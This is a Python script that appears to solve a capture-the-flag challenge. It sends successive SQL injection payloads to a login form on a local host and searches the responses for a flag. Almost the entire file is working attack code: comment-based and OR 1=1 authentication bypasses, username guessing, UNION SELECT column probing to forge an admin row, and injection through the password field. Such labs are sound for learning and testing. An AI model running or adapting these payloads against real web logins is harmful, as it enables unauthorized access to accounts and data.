import requests
import urllib.parse
import re

target = "http://127.0.0.1:32895/index.php"

print("="*80)
print("SQL INJECTION TESTING - LOGIN FORM")
print(f"Target: {target}")
print("="*80)

# Test payloads with different comment syntaxes
comment_payloads = [
    ("admin'-- ", "x", "SQL comment with space"),
    ("admin'-- -", "x", "SQL comment with dash"),
    ("admin'--+-", "x", "SQL comment URL-safe"),
    ("admin'#", "x", "MySQL hash comment"),
    ("admin'/*", "x", "C-style comment start"),
    ("admin'%23", "x", "URL-encoded hash"),
    ("admin'%20--%20", "x", "URL-encoded space comment"),
]

print("\n[PHASE 1] Testing SQL comment injection to bypass password check...")
print("-"*80)

for user, pwd, desc in comment_payloads:
    params = {'username': user, 'password': pwd}
    resp = requests.get(target, params=params)
    
    # Check for FLAG pattern
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!] FLAG FOUND!")
        print(f"Payload: username={user}, password={pwd}")
        print(f"Description: {desc}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    # Check for success indicators
    if "not the admin" in resp.text.lower():
        print(f"[✗] {desc:30s} | username={user:20s} | Result: Not admin")
    elif "login" in resp.text.lower() and len(resp.text) < 500:
        print(f"[✗] {desc:30s} | username={user:20s} | Result: Login failed")
    else:
        print(f"[?] {desc:30s} | username={user:20s} | Result: ANOMALY")
        print(f"    Response length: {len(resp.text)} bytes")
        print(f"    Response preview: {resp.text[:200]}")

# OR-based bypass payloads
print("\n[PHASE 2] Testing OR-based authentication bypass...")
print("-"*80)

or_payloads = [
    ("' OR 1=1-- -", "x", "Classic OR 1=1"),
    ("' OR '1'='1'-- -", "x", "String comparison OR"),
    ("admin' OR '1'='1", "x", "Admin with OR bypass"),
    ("admin' OR 1=1#", "x", "Admin OR with hash comment"),
    ("admin' OR 1=1-- -", "x", "Admin OR with dash comment"),
    ("' OR 'a'='a'-- -", "x", "String equality OR"),
    ("admin'or'1'='1", "x", "No space OR"),
]

for user, pwd, desc in or_payloads:
    params = {'username': user, 'password': pwd}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!] FLAG FOUND!")
        print(f"Payload: username={user}, password={pwd}")
        print(f"Description: {desc}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    if "not the admin" in resp.text.lower():
        print(f"[✗] {desc:30s} | username={user:20s} | Result: Not admin")
    elif "login" in resp.text.lower() and len(resp.text) < 500:
        print(f"[✗] {desc:30s} | username={user:20s} | Result: Login failed")
    else:
        print(f"[?] {desc:30s} | username={user:20s} | Result: ANOMALY")
        print(f"    Response preview: {resp.text[:200]}")

# Test with different usernames
print("\n[PHASE 3] Testing different username values with SQL injection...")
print("-"*80)

usernames = ["admin", "root", "Administrator", "user", "test"]
for username in usernames:
    for comment in ["'-- ", "'-- -", "'#"]:
        user = username + comment
        params = {'username': user, 'password': 'x'}
        resp = requests.get(target, params=params)
        
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        
        if flag_match:
            print(f"\n[!] FLAG FOUND!")
            print(f"Payload: username={user}, password=x")
            print(f"Flag: {flag_match.group(0)}")
            print(f"\nFull Response:\n{resp.text}")
            exit(0)
        
        if "not the admin" not in resp.text.lower() and "login" not in resp.text.lower():
            print(f"[?] {username:15s} + {comment:10s} | Possible success")
        else:
            print(f"[✗] {username:15s} + {comment:10s} | Failed")

# UNION SELECT payloads to manipulate admin field
print("\n[PHASE 4] Testing UNION SELECT to inject admin privilege...")
print("-"*80)

# Try different column counts
union_payloads = [
    ("' UNION SELECT 'admin','x',1-- -", "x", "3 columns with admin"),
    ("' UNION SELECT 'admin','x'-- -", "x", "2 columns"),
    ("admin' UNION SELECT 'admin','x',1-- -", "x", "Admin prefix 3 cols"),
    ("' UNION SELECT 1,2,3-- -", "x", "Detect column count 3"),
    ("' UNION SELECT 1,2-- -", "x", "Detect column count 2"),
    ("' UNION SELECT 1-- -", "x", "Detect column count 1"),
    ("' UNION SELECT 'admin','pass',1,1-- -", "x", "4 columns"),
    ("' UNION SELECT NULL,NULL,NULL-- -", "x", "NULL 3 columns"),
]

for user, pwd, desc in union_payloads:
    params = {'username': user, 'password': pwd}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!] FLAG FOUND!")
        print(f"Payload: username={user}, password={pwd}")
        print(f"Description: {desc}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    # Check for error messages that might reveal structure
    if "error" in resp.text.lower() or "syntax" in resp.text.lower():
        print(f"[!] {desc:30s} | SQL ERROR - reveals structure")
        print(f"    Error: {resp.text[:300]}")
    elif "not the admin" in resp.text.lower():
        print(f"[✗] {desc:30s} | Query executed but not admin")
    elif "login" in resp.text.lower():
        print(f"[✗] {desc:30s} | Login failed")
    else:
        print(f"[?] {desc:30s} | ANOMALY - length: {len(resp.text)}")

# Password field injection
print("\n[PHASE 5] Testing password field SQL injection...")
print("-"*80)

pwd_payloads = [
    ("admin", "' OR '1'='1'-- -", "OR in password"),
    ("admin", "' OR 1=1-- -", "Numeric OR in password"),
    ("admin", "'-- -", "Comment in password"),
]

for user, pwd, desc in pwd_payloads:
    params = {'username': user, 'password': pwd}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!] FLAG FOUND!")
        print(f"Payload: username={user}, password={pwd}")
        print(f"Description: {desc}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    if "not the admin" in resp.text.lower():
        print(f"[✗] {desc:30s} | Not admin")
    else:
        print(f"[?] {desc:30s} | Response: {resp.text[:150]}")

print("\n" + "="*80)
print("TESTING COMPLETE - No flag found in responses")
print("="*80)

